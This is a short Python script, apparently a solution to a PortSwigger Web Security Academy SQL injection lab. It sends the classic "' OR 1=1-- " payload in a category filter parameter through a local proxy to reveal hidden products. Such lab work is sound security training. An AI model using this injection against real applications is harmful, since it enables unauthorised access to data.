# https://portswigger.net/web-security/sql-injection/lab-retrieve-hidden-data

import requests
requests.packages.urllib3.disable_warnings()

url = "https://acd91f181f92455c8082814800a900af.web-security-academy.net/filter"
proxy = "127.0.0.1:8080"
proxies = {"https://": proxy, "http://": proxy}
verify = False

q = "' OR 1=1-- "
params = {"category": q}

r = requests.get(url, proxies=proxies, params=params, verify=verify)
print(r.text)

# https://acd91f181f92455c8082814800a900af.web-security-academy.net/filter?category=%27+OR+1%3D1--+
